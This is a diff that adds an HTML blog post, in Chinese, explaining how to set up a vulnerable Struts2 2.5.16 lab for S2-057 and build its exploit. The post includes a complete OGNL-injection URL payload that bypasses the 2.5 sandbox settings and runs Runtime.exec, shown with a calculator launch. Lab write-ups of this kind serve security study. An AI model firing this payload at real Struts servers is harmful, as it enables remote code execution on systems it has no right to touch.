@@ -1,0 +1,64 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><title>S2-057 漏洞环境搭建及EXP构造(Struts2 2.5.16) [ 梅子酒の笔记本 ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script></head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel" href="https://github.com/meizjm3i">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Meizj's Blog</a></div><article id="post"><h1 id="postTitle">S2-057 漏洞环境搭建及EXP构造(Struts2 2.5.16)</h1><h1 id="环境搭建"><a class="header-anchor" href="#环境搭建"></a>环境搭建</h1>
+<p>环境说明:</p>
+<blockquote>
+<ol>
+<li>Struts2 2.5.16</li>
+<li>Tomcat 9.6.0</li>
+<li>Intellij IDEA</li>
+</ol>
+</blockquote>
+<p>首先下载Struts2的包以及Tomcat,Struts2的包地址如下:</p>
+<blockquote>
+<p><a href="https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip</a></p>
+</blockquote>
+<p>将 /apps 下的 struts2-showcase.war 放入Tomcat 的 /webapps 下,如图:</p>
+<p>将 /webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml 以及 /webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining/xml 内的内容更换如下:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">	<span class="string">"-//Apache Software Foundation//DTD Struts Configuration 2.5//EN"</span></span><br><span class="line">	<span class="string">"http://struts.apache.org/dtds/struts-2.5.dtd"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;struts&gt;</span><br><span class="line">    &lt;<span class="keyword">package</span> name=<span class="string">"actionchaining"</span> extends=<span class="string">"struts-default"</span>&gt;</span><br><span class="line">        &lt;action name=<span class="string">"actionChain1"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.apache.struts2.showcase.actionchaining.ActionChain1"</span>&gt;</span><br><span class="line">            &lt;result type=<span class="string">"redirectAction"</span>&gt;</span><br><span class="line">                &lt;param name = "actionName"&gt;register2&lt;/param&gt;</span><br><span class="line">            &lt;/result&gt;</span><br><span class="line">        &lt;/action&gt;</span><br><span class="line">    &lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure>
+<p>回到 /bin 目录,执行:</p>
+<blockquote>
+<p>./startup.sh</p>
+</blockquote>
+<p>便可以启动tomcat服务器,访问</p>
+<blockquote>
+<p><a href="http://0.0.0.0:8080/struts2-showcase/" target="_blank" rel="noopener">http://0.0.0.0:8080/struts2-showcase/</a></p>
+</blockquote>
+<p>若能看到正常返回,则环境搭建正常,继续访问:</p>
+<blockquote>
+<p><a href="http://0.0.0.0:8080/struts2-showcase/actionchaining/$%7B(1+1)%7D/register2.action" target="_blank" rel="noopener">http://0.0.0.0:8080/struts2-showcase/actionchaining/${(1+1)}/register2.action</a></p>
+</blockquote>
+<p>发现跳转到了:</p>
+<blockquote>
+<p><a href="http://0.0.0.0:8080/struts2-showcase/actionchaining/2/register2.action" target="_blank" rel="noopener">http://0.0.0.0:8080/struts2-showcase/actionchaining/2/register2.action</a></p>
+</blockquote>
+<p>漏洞环境至此搭建完成</p>
+<h1 id="漏洞原理分析"><a class="header-anchor" href="#漏洞原理分析"></a>漏洞原理分析</h1>
+<p>这一部分,chybeta师傅讲的很清楚了,附上链接:</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/2618" target="_blank" rel="noopener">https://xz.aliyun.com/t/2618</a></p>
+</blockquote>
+<h1 id="exp构造"><a class="header-anchor" href="#exp构造"></a>EXP构造</h1>
+<p>网上放出的exp基本都是 Struts2 比较老的版本,对于2.5.16这种比较新的版本而言,ognl新添了部分过滤.</p>
+<p>因此相比较于网上常见的2.3的exp,2.5的exp需要进行部分改动.</p>
+<p>在2.5.16的环境下使用payload:</p>
+<blockquote>
+<p>${(#ct=#request[‘struts.valueStack’].context).(#cr=#ct[‘com.opensymphony.xwork2.ActionContext.container’]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))}</p>
+</blockquote>
+<p>观察url会返回:</p>
+<blockquote>
+<p><a href="http://0.0.0.0:8080/struts2-showcase/actionchaining/com.opensymphony.xwork2.ognl.OgnlUtil@55dd2f12/register2.action" target="_blank" rel="noopener">http://0.0.0.0:8080/struts2-showcase/actionchaining/com.opensymphony.xwork2.ognl.OgnlUtil@55dd2f12/register2.action</a></p>
+</blockquote>
+<p>可以发现,这一部分的取值是能够正常进行的,而我们再看看2.3版本的exp(图是直接从其他师傅博客扒的:</p>
+<p><img src="/img/13.png" alt></p>
+<p>我们可以看到,一开始调用OgnlContext去获取member_access,而我们再看下2.5版本的ExcludedClass:</p>
+<p><img src="/img/14.png" alt></p>
+<p><img src="/img/15.png" alt></p>
+<p>因此需要对exp进行部分改动.我们可以通过setExcludedClasses与setExcludedPackageNames来覆盖默认的设置,因此我们便可以引入ognl.OgnlContext了.</p>
+<p>附上弹计算器的payload:</p>
+<blockquote>
+<p><a href="http://0.0.0.0:8080/struts2-showcase/actionchaining/$%7B(%23ct=%23request%5B'struts.valueStack'%5D.context).(%23cr=%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D" target="_blank" rel="noopener">http://0.0.0.0:8080/struts2-showcase/actionchaining/${(%23ct=%23request[‘struts.valueStack’].context).(%23cr=%23ct[‘com.opensymphony.xwork2.ActionContext.container’]</a>).(%23ou=%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.setExcludedClasses(‘java.lang.Shutdown’)).(%23ou.setExcludedPackageNames(‘sun.reflect.’)).(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct.setMemberAccess(%23dm)).(%23cmd=@java.lang.Runtime@getRuntime().exec(‘open%20/Applications/Calculator.app’))%7D/actionChain1.action</p>
+</blockquote>
+</article><div id="paginator"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script>$(window).on('load', function(){ 
+$('pre').addClass('prettyprint linenums');
+prettyPrint();
+});
+$(".gutter").remove();</script></body></html>
